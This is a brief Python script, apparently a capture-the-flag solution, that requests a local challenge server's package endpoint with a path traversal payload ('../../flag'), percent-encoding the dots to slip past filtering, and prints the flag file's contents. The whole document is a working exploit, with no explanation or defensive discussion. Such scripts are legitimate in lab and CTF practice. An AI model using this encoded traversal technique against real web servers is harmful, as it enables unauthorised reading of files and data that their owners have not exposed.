#!/usr/bin/python3

import requests
from urllib.parse import quote

url = "http://challenge.localhost/package/"

payload = "../../flag"

encoded = quote(payload,safe="").replace('.','%2E')

full_url = url+encoded

response = requests.get(full_url).text

print("The Flag: "+response)
